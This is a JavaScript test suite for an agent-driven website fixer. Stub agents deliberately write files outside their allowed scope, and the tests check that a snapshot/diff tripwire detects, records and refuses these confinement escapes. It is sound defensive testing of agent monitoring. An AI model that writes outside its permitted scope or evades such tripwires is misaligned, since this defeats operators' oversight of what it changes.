function testFixModeScopeEdgeCases() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-fixedges-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    const drive = ({ outName, body, extraArgs = [], skipFindings = false }) => {
      const bin = join(binDir, 'claude');
      writeFileSync(bin, `#!/bin/sh\n${body}\n`);
      chmodSync(bin, 0o755);
      const args = [
        join(repoRoot, 'fixer', 'fix.mjs'),
        '--target', 'src', '--audit-url', 'http://example.test/', '--agent', 'claude',
        '--max-iterations', '1',
        ...(skipFindings ? [] : ['--findings', findings]),
        // See above: the tripwire is what is under test here, not a boundary.
        '--isolation', 'host-permission-model',
        '--out', outName, '--reports-root', `reports-${outName}`,
        ...extraArgs,
      ];
      const res = run(process.execPath, args, { cwd: root, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
      return { res, outDir: join(root, outName) };
    };

    const inScope = `printf 'fixed' > ${JSON.stringify(join(root, 'src', 'index.html'))}`;
    const outside = `printf 'pwned' > ${JSON.stringify(join(root, 'outside.txt'))}`;
    const report = (outName) => `cp ${JSON.stringify(findings)} ${JSON.stringify(join(root, outName, 'report.json'))}`;

    // A: the write lands and THEN the agent exits non-zero. The rejection must not
    // abort the process before the diff and the escape diagnosis are computed.
    const a = drive({ outName: 'edge-crash', body: `${inScope}\n${outside}\nexit 7` });
    assert(a.res.status !== 0, `fix scope: a crashing agent must still fail the run (exit ${a.res.status})`);
    assert(
      /CONFINEMENT FAILURE/.test(a.res.stderr),
      `fix scope: an escape must be diagnosed even when the agent then crashes:\n${a.res.stderr}`,
    );
    assert(
      existsSync(join(a.outDir, 'iter-1-diff.json')),
      'fix scope: the per-iteration diff must exist even when the agent crashed',
    );
    const escA = JSON.parse(readFileSync(join(a.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escA.escapedOutsideScope.some((p) => p.endsWith('outside.txt')),
      `fix scope: the escaped path must be recorded despite the crash, got ${JSON.stringify(escA.escapedOutsideScope)}`,
    );
    assert(typeof escA.agentError === 'string' && escA.agentError.length > 0, 'fix scope: the agent error must be recorded in the diff record');
    // A refused run must not be published as a result: no retained after-run and
    // no scorecard, or a tampered tree becomes the newest run for that host.
    assert(/Not recording a retained run/.test(a.res.stdout), `fix scope: a refused run must record no result:\n${a.res.stdout}`);
    // Nothing at all is published by a refused run: no run dirs and no `latest`,
    // so a consumer reading the host's newest result cannot see the refused tree.
    const crashRoot = join(root, 'reports-edge-crash');
    const crashHosts = existsSync(crashRoot) ? readdirSync(crashRoot) : [];
    assert(crashHosts.length === 0, `fix scope: a refused run must publish nothing, got ${JSON.stringify(crashHosts)}`);
    assert(!existsSync(join(crashRoot, 'example_test', 'latest')), 'fix scope: a refused run must not move latest');

    // H (the missing half): a climb that reaches zero outstanding issues must
    // still publish - exit 0, a retained after run, a `latest` pointing at it, and
    // a scorecard. Without this, a guard that broke every successful run would
    // pass the assertions above.
    const h = drive({
      outName: 'edge-pass',
      body: `${inScope}\ncp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'edge-pass', 'report.json'))}`,
    });
    assert(h.res.status === 0, `fix scope: a successful climb must exit 0 (got ${h.res.status})\n${h.res.stdout}${h.res.stderr}`);
    assert(/^PASS:/m.test(h.res.stdout), `fix scope: a successful climb must say PASS:\n${h.res.stdout}`);
    assert(!/CONFINEMENT FAILURE/.test(h.res.stderr), 'fix scope: a successful climb must not refuse');
    const passHosts = readdirSync(join(root, 'reports-edge-pass'));
    assert(passHosts.length === 1, `fix scope: a successful climb publishes one host dir, got ${JSON.stringify(passHosts)}`);
    const passHostRoot = join(root, 'reports-edge-pass', passHosts[0]);
    const passEntries = readdirSync(passHostRoot);
    assert(passEntries.some((e) => e.endsWith('-after')), `fix scope: a successful climb records an after run, got ${JSON.stringify(passEntries)}`);
    assert(existsSync(join(passHostRoot, 'latest')), 'fix scope: a successful climb must move latest');
    assert(
      readlinkSync(join(passHostRoot, 'latest')).endsWith('-after'),
      'fix scope: latest must point at the after run',
    );
    assert(existsSync(join(passHostRoot, 'scorecard.html')), 'fix scope: a successful climb must publish a scorecard');

    // B: the baseline audit (no --findings) spawns the same write-capable agent
    // under the same untrusted context, so it must be scoped too - otherwise the
    // damage is both unmonitored and baked into iteration 1's clean baseline.
    const b = drive({ outName: 'edge-baseline', skipFindings: true, body: `printf 'pwned' > ${JSON.stringify(join(root, 'baseline-outside.txt'))}` });
    assert(b.res.status !== 0, `fix scope: an escaping baseline audit must fail the run (exit ${b.res.status})`);
    assert(/CONFINEMENT FAILURE/.test(b.res.stderr), `fix scope: the baseline audit escape must be diagnosed:\n${b.res.stderr}`);
    assert(existsSync(join(b.outDir, 'iter-0-diff.json')), 'fix scope: the baseline audit must produce its own diff record');
    const escB = JSON.parse(readFileSync(join(b.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      escB.escapedOutsideScope.some((p) => p.endsWith('baseline-outside.txt')),
      `fix scope: the baseline escaped path must be recorded, got ${JSON.stringify(escB.escapedOutsideScope)}`,
    );

    // C (positive control): an in-scope edit plus a report.json completes the run
    // path normally - no refusal, a diff record, and a climb summary.
    const c = drive({ outName: 'edge-clean', body: `${inScope}\n${report('edge-clean')}` });
    assert(!/CONFINEMENT FAILURE/.test(c.res.stderr), `fix scope: an in-scope run must not refuse:\n${c.res.stderr}`);
    assert(!existsSync(join(c.outDir, 'confinement-escape.json')), 'fix scope: an in-scope run must write no escape artifact');
    assert(/Hill-climb summary/.test(c.res.stdout), `fix scope: an in-scope run must reach the climb summary:\n${c.res.stdout}`);
    assert(existsSync(join(c.outDir, 'iter-1-diff.json')), 'fix scope: an in-scope run must write its per-iteration diff');

    // D: --allow-write is the documented way to permit a legitimate build output
    // instead of tripping the refusal.
    const d = drive({
      outName: 'edge-build',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${report('edge-build')}`,
    });
    assert(
      !/CONFINEMENT FAILURE/.test(d.res.stderr),
      `fix scope: --allow-write dist must permit a build output:\n${d.res.stderr}`,
    );
    const diffD = JSON.parse(readFileSync(join(d.outDir, 'iter-1-diff.json'), 'utf8'));
    assert(
      diffD.changed.added.includes(join('dist', 'bundle.js')),
      `fix scope: an allowed build output must still be recorded in the diff, got ${JSON.stringify(diffD.changed.added)}`,
    );

    // F: a baseline audit that exits 0 without writing report.json used to die on
    // an unguarded readReport - a raw stack where the run should name the problem.
    const f = drive({ outName: 'edge-no-report', skipFindings: true, body: `printf 'nothing' > /dev/null` });
    assert(f.res.status !== 0, `fix scope: a baseline audit with no report must fail the run (exit ${f.res.status})`);
    assert(/Cannot start the climb/.test(f.res.stderr), `fix scope: the baseline failure must be named:\n${f.res.stderr}`);
    assert(
      !/Unhandled|^\s+at .+:\d+:\d+\)?$/m.test(f.res.stderr),
      `fix scope: the baseline failure must not be a raw stack trace:\n${f.res.stderr}`,
    );

    // G: an out-of-tree --allow-write directory is permitted AND walked, so its
    // edits are in the diff instead of silently missing from it.
    const allowTarget = mkdtempSync(join(tmpdir(), 'web-uplift-allow-'));
    try {
      const g = drive({
        outName: 'edge-allow-outside',
        extraArgs: ['--allow-write', allowTarget],
        body: `${inScope}\nprintf 'built' > ${JSON.stringify(join(allowTarget, 'bundle.js'))}\n${report('edge-allow-outside')}`,
      });
      assert(!/CONFINEMENT FAILURE/.test(g.res.stderr), `fix scope: an out-of-tree --allow-write dir must be permitted:\n${g.res.stderr}`);
      const diffG = JSON.parse(readFileSync(join(g.outDir, 'iter-1-diff.json'), 'utf8'));
      assert(
        diffG.changed.added.some((p) => p.endsWith('bundle.js')),
        `fix scope: an out-of-tree --allow-write dir must be walked, got ${JSON.stringify(diffG.changed.added)}`,
      );
      assert(diffG.escapedOutsideScope.length === 0, `fix scope: an allowed root must not be an escape: ${JSON.stringify(diffG.escapedOutsideScope)}`);
    } finally {
      rmSync(allowTarget, { recursive: true, force: true });
    }

    // E: --allow-write must NOT widen the refusal for anything else.
    const e = drive({
      outName: 'edge-build-escape',
      extraArgs: ['--allow-write', 'dist'],
      body: `${inScope}\nmkdir -p ${JSON.stringify(join(root, 'dist'))}\nprintf 'bundle' > ${JSON.stringify(join(root, 'dist', 'bundle.js'))}\n${outside}`,
    });
    assert(/CONFINEMENT FAILURE/.test(e.res.stderr), `fix scope: --allow-write must not disable the refusal for other paths:\n${e.res.stderr}`);
    const escE = JSON.parse(readFileSync(join(e.outDir, 'confinement-escape.json'), 'utf8'));
    assert(
      !escE.escapedOutsideScope.some((p) => p.endsWith(join('dist', 'bundle.js'))),
      'fix scope: an allowed root must not be reported as an escape',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-arp, minimal design: this tool does NOT sandbox the agent. It refuses
// to spawn a write-capable agent unless the operator asserts which boundary they are
// providing, it says loudly that it cannot verify that assertion, it records the
// assertion as unverified, and the snapshot/diff tripwire stays as defence in depth.
function testFixIsolationAssertion() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-isolation-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(join(root, 'src'), { recursive: true });
    mkdirSync(binDir, { recursive: true });
    writeFileSync(join(root, 'src', 'index.html'), '<h1>hi</h1>');
    const agentMarker = join(root, 'agent-ran.txt');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, `#!/bin/sh\nprintf ran > ${JSON.stringify(agentMarker)}\nprintf x > ${JSON.stringify(join(root, 'escape.txt'))}\n`);
    chmodSync(bin, 0o755);
    const env = { ...process.env, PATH: `${binDir}:${process.env.PATH}` };
    const drive = (extra) => run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', 'src', '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--out', extra.out, '--reports-root', extra.reports, '--max-iterations', '1', ...(extra.args ?? [])],
      { cwd: root, env },
    );

    // Default: refuse BEFORE any agent spawn, and record the refusal.
    const refused = drive({ out: 'out-refused', reports: 'reports-refused' });
    assert(refused.status !== 0, `isolation: no assertion must refuse (exit ${refused.status})`);
    assert(/REFUSED/.test(refused.stderr) && /NO AGENT WAS STARTED/.test(refused.stderr), `isolation: the refusal must say no agent was started:\n${refused.stderr}`);
    assert(/--isolation/.test(refused.stderr), 'isolation: the refusal must name what is required');
    assert(!existsSync(agentMarker), 'isolation: the agent must NOT have been spawned');
    const refusedRecord = JSON.parse(readFileSync(join(root, 'out-refused', 'run-security.json'), 'utf8'));
    assert(refusedRecord.isolation === 'refused', `isolation: the refusal must be recorded (${refusedRecord.isolation})`);
    assert(!existsSync(join(root, 'reports-refused')), 'isolation: a refused run must leave the report history untouched');
    assert(!existsSync(join(root, 'escape.txt')), 'isolation: a refused run must not have run anything that could write');

    // With the assertion: allowed, but loud and recorded as UNVERIFIED.
    const asserted = drive({ out: 'out-asserted', reports: 'reports-asserted', args: ['--isolation', 'host-permission-model'] });
    assert(existsSync(agentMarker), 'isolation: an explicit assertion must allow the run to spawn the agent');
    assert(/WARNING/.test(asserted.stderr) && /UNVERIFIED/.test(asserted.stderr), `isolation: the warning must say the boundary is unverified:\n${asserted.stderr}`);
    const record = JSON.parse(readFileSync(join(root, 'out-asserted', 'run-security.json'), 'utf8'));
    assert(record.isolation === 'operator-supplied:host-permission-model', `isolation: the record must name the asserted mechanism (${record.isolation})`);
    assert(record.unverified === true, 'isolation: the record must mark the assertion unverified');
    assert(!/verified by this tool|guaranteed/i.test(asserted.stderr), 'isolation: the warning must not claim the tool verified anything');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// The positive path that matters now: with an assertion given, a legitimate fix runs,
// edits --target, reaches zero outstanding issues and publishes its result.
function testFixIsolatedRunPublishes() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-iso-run-'));
  try {
    const binDir = join(root, 'bin');
    const fixture = join(root, 'site');
    mkdirSync(binDir, { recursive: true });
    mkdirSync(fixture, { recursive: true });
    writeFileSync(join(fixture, 'index.html'), '<h1>before</h1>');
    const bin = join(binDir, 'claude');
    writeFileSync(bin, [
      '#!/bin/sh',
      `printf '<h1>after</h1>' > ${JSON.stringify(join(fixture, 'index.html'))}`,
      `cp ${JSON.stringify(join(repoRoot, 'examples', 'playground-report-fixed.json'))} ${JSON.stringify(join(root, 'out', 'report.json'))}`,
      'echo \'{"agent":"stub"}\'',
    ].join('\n') + '\n');
    chmodSync(bin, 0o755);
    const res = run(
      process.execPath,
      [join(repoRoot, 'fixer', 'fix.mjs'), '--target', fixture, '--audit-url', 'http://example.test/',
        '--agent', 'claude', '--findings', join(repoRoot, 'examples', 'playground-report.json'),
        '--isolation', 'vm', '--out', join(root, 'out'), '--reports-root', join(root, 'reports'), '--max-iterations', '1'],
      { cwd: repoRoot, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } },
    );
    assert(/after/.test(readFileSync(join(fixture, 'index.html'), 'utf8')), 'isolation run: the agent edited --target');
    assert(res.status === 0, `isolation run: a legitimate fix must exit 0 (got ${res.status})\n${res.stdout}${res.stderr}`);
    assert(/^PASS:/m.test(res.stdout ?? ''), `isolation run: the fix must report PASS:\n${res.stdout}`);
    const host = readdirSync(join(root, 'reports'))[0];
    const entries = readdirSync(join(root, 'reports', host));
    assert(entries.some((e) => e.endsWith('-after')), `isolation run: the after run must be published (${JSON.stringify(entries)})`);
    assert(existsSync(join(root, 'reports', host, 'latest')), 'isolation run: latest must be published');
    assert(
      existsSync(join(root, 'reports', host, readlinkSync(join(root, 'reports', host, 'latest')), 'run-security.json')),
      'isolation run: the isolation record must travel into the retained result',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-wy6: the batch audit path gets the same write-scope accounting as fix
// mode, with FOUR things a review found missing: the DEFAULT output must be walked
// (the generic exclusion skips a directory named reports/), a refused run must not be
// usable as the current result for its URL, concurrent runs must not refuse each
// other's clean work, and the escape path must be exercised with a FAILING agent.
function testBatchWriteScope() {
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-batchscope-'));
  try {
    const binDir = join(root, 'bin');
    mkdirSync(binDir, { recursive: true });
    const findings = join(repoRoot, 'examples', 'playground-report.json');

    const drive = ({ args = [], body, extraArgs = [], cwd = root }) => {
      const bin = join(binDir, 'claude');
      if (body) {
        writeFileSync(bin, `#!/bin/sh\n${body}\n`);
        chmodSync(bin, 0o755);
      }
      const res = run(process.execPath, [join(repoRoot, 'runner', 'run-batch.mjs'), ...args, '--agent', 'claude', ...extraArgs],
        { cwd, env: { ...process.env, PATH: `${binDir}:${process.env.PATH}` } });
      return res;
    };
    const writesReport = (outAbs) => [
      `d=$(ls -dt ${JSON.stringify(outAbs)}/*/*/ 2>/dev/null | head -1)`,
      `cp ${JSON.stringify(findings)} "$d/report.json"`,
    ].join('\n');
    const hostDir = (outName) => {
      const abs = join(root, outName);
      const host = readdirSync(abs)[0];
      return { root: join(abs, host), run: readdirSync(join(abs, host)).find((e) => !e.startsWith('latest')) };
    };

    // 1. THE DEFAULT OUTPUT (no --out at all, i.e. `reports/`) must be walked and
    //    recorded as an allowed change. A positive control on a convenient custom
    //    output name hid exactly this: the default tree is dropped by the generic
    //    exclusion, so it was unwatched in both directions.
    const dflt = drive({ args: ['https://example.com/'], extraArgs: ['--concurrency', '1'], body: writesReport(join(root, 'reports')) });
    assert(dflt.status === 0, `batch default output: a normal audit must exit 0 (got ${dflt.status})\n${dflt.stdout}${dflt.stderr}`);
    assert(/done \(coverage complete\)/.test(dflt.stdout), `batch default output: the audit must complete:\n${dflt.stdout}`);
    const dfltRun = hostDir('reports');
    const dfltScope = JSON.parse(readFileSync(join(dfltRun.root, dfltRun.run, 'write-scope.json'), 'utf8'));
    assert(dfltScope.escapedOutsideScope.length === 0, `batch default output: nothing refused (${JSON.stringify(dfltScope.escapedOutsideScope)})`);
    assert(
      dfltScope.changed.added.some((p) => p.includes(join('reports', 'example_com'))),
      `batch default output: the DEFAULT output tree must be recorded as an allowed change, got ${JSON.stringify(dfltScope.changed.added)}`,
    );

    // 2. A REFUSED RUN MUST NOT BE THE CURRENT RESULT. The refusal skips the pointer,
    //    but latest resolution falls back to the newest run CONTAINING a report, so a
    //    refused run could become what --resume treats as done and skip the URL.
    const refused = drive({ args: ['https://refused.example/'], extraArgs: ['--concurrency', '1', '--out', 'r-out'],
      body: `${writesReport(join(root, 'r-out'))}\nprintf 'pwned' > ${JSON.stringify(join(root, 'escaped.txt'))}` });
    assert(refused.status !== 0, `batch refusal: an escaping audit must exit non-zero (${refused.status})`);
    const refusedHost = join(root, 'r-out', readdirSync(join(root, 'r-out'))[0]);
    const refusedRun = readdirSync(refusedHost).find((e) => !e.startsWith('latest'));
    assert(existsSync(join(refusedHost, refusedRun, 'run-refused.json')), 'batch refusal: the run must be marked as refused');
    assert(!existsSync(join(refusedHost, refusedRun, 'report.json')), 'batch refusal: a refused run must not leave a report behind');
    const resume = drive({ args: ['https://refused.example/'], extraArgs: ['--concurrency', '1', '--out', 'r-out', '--resume'], body: writesReport(join(root, 'r-out')) });
    assert(!/resume skip/.test(resume.stdout), `batch refusal: --resume must NOT skip a URL whose only run was refused:\n${resume.stdout}`);

    // 3. CONCURRENCY MUST NOT REFUSE CLEAN WORK. Two URLs, one escaping agent: the
    //    clean URL shares the project tree, so an overlapping snapshot window would
    //    catch the other agent's write and refuse it too. The scope windows are
    //    serialized; the clean URL must complete.
    const twoUp = drive({
      args: ['https://clean.example/', 'https://dirty.example/'],
      extraArgs: ['--concurrency', '2', '--out', 'c-out'],
      // The stub derives its run dir from the URL slug rather than parsing the prompt
      // or trusting mtime: under --concurrency the two workers' directories are
      // created within milliseconds of each other, and a newest-first guess puts the
      // report in the wrong run (which is a bug in the test, not in the guard).
      body: [
        `slug=$(printf '%s\\n' "$@" | grep -o 'https://[a-z]*\\.example' | head -1 | sed 's#https://##; s/\\./_/g')`,
        `d=$(ls -dt ${JSON.stringify(join(root, 'c-out'))}/"$slug"/*/ 2>/dev/null | head -1)`,
        `cp ${JSON.stringify(findings)} "$d/report.json"`,
        `case "$*" in *dirty.example*) printf 'pwned' > ${JSON.stringify(join(root, 'c-escaped.txt'))};; esac`,
      ].join('\\n'),
    });
    assert(twoUp.status !== 0, 'batch concurrency: the dirty URL must still fail the batch');
    assert(
      /done \(coverage complete\)\s+https:\/\/clean\.example\//.test(twoUp.stdout),
      `batch concurrency: the CLEAN url must still complete when a neighbour escapes:\n${twoUp.stdout}`,
    );

    // 4. THE ESCAPE PATH WITH A FAILING AGENT: the diff must still be computed and the
    //    refusal still recorded when the agent exits non-zero (the earlier stub always
    //    exited 0, so this path was untested).
    const failing = drive({ args: ['https://failing.example/'], extraArgs: ['--concurrency', '1', '--out', 'f-out'],
      body: `printf 'pwned' > ${JSON.stringify(join(root, 'f-escaped.txt'))}\nexit 7` });
    assert(failing.status !== 0, `batch failing agent: must exit non-zero (${failing.status})`);
    assert(/CONFINEMENT FAILURE/.test(failing.stderr), `batch failing agent: the escape must still be diagnosed:\n${failing.stderr}`);
    const failingHost = join(root, 'f-out', readdirSync(join(root, 'f-out'))[0]);
    const failingRun = readdirSync(failingHost).find((e) => !e.startsWith('latest'));
    const failingScope = JSON.parse(readFileSync(join(failingHost, failingRun, 'write-scope.json'), 'utf8'));
    assert(
      failingScope.escapedOutsideScope.some((p) => p.endsWith('f-escaped.txt')),
      `batch failing agent: the escaped path must be recorded even though the agent died (${JSON.stringify(failingScope.escapedOutsideScope)})`,
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}
